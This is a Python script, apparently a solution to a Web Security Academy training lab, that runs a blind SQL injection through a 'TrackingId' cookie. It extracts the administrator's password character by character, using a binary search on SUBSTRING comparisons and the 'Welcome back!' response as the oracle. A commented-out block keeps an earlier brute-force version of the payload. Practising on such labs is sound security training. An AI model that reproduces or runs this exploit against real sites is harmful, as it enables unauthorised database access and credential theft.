import time
import requests
from itertools import chain

url = 'https://acdb1ff01f6e6e7c80db11ed00b7001d.web-security-academy.net/'
cookies = {
    "TrackingId": '', 
    "session": "hxaMr8NDxfEaoOW9W2wFbLvkGLLyMZHd"
}

password = []
alphanumerics = [
        open('numbers.txt', 'r').read().split('\n'),
        open('lowercase.txt', 'r').read().split('\n')
]

# flatten
alphanumerics = list(chain.from_iterable(alphanumerics))

def getVal(i, char, op):
    return '\' and \'a\' = (select \'a\' from users where username = \'administrator\' and SUBSTRING(Password, {i}, 1) {op} \'{char}\')--'.format(i=i, char=char, op=op)

num_http_calls = 0

for i in range(1, 7):
    start = 0
    end = len(alphanumerics)
    char_i = end//2

    while True:

        char = alphanumerics[char_i]

        print('===')
        print('end: {end}'.format(end=end))
        print('start: {start}'.format(start=start))
        print('char_i: {char_i}'.format(char_i=char_i))
        print('char: {char}'.format(char=char))

        val=getVal(i, char, '=')

        print(val)

        cookies['TrackingId'] = val
        response = requests.get(url, cookies=cookies)
        num_http_calls += 1
        if 'Welcome back!' in response.text:
            password.append(char)
            print('>> character at position [{pos}] is [{char}]. password so far: [{password}].'.format(pos=i, char=char, password=password))
            break
        else:

            cookies['TrackingId'] = getVal(i, char, '<')
            response = requests.get(url, cookies=cookies)
            num_http_calls += 1
            if 'Welcome back!' in response.text:
                end = char_i
                char_i = (start+end)//2
            else:
                
                cookies['TrackingId'] = getVal(i, char, '>')
                response = requests.get(url, cookies=cookies)
                num_http_calls += 1
                if 'Welcome back!' in response.text:
                    start = char_i
                    char_i = (start+end)//2
                else:
                    print('>> Error is possible: {char} is neither < nor > nor = the character in the password at position {pos}'.format(char=char, pos=i))
    print('>>> character position [{pos}] is exhausted. password so far: [{password}]'.format(pos=i, password=password))

        
            

    # for char in alphanumerics:

    #     val = 'TW6DXxy5CSCloV9Ks\' union select \'a\' from users where username = \'administrator\' and SUBSTRING(Password, 1, {index}) = \'{test_char}\'--'.format(index=i, test_char=char)
    #     # val='TW6DXxy5CSCloV9Ks'
    #     cookies['TrackingId'] = val

    #     response = requests.get(url, cookies=cookies)

    #     if 'Welcome back!' in response.text:
    #         password.append(char)
    #         print('character at position [{pos}] is [{char}]. password so far: [{password}].'.format(pos=i, char=char, password=password))
    #         break
    #     # else:
    #     #     print('character at position [{pos}] is not [{char}].'.format(pos=i, char=char, password=password))
    # print('character position [{pos}] is exhausted. password so far: [{password}]'.format(pos=i, password=password))
    # time.sleep(1)

print(''.join(password))
print('number of http calls')
print(num_http_calls)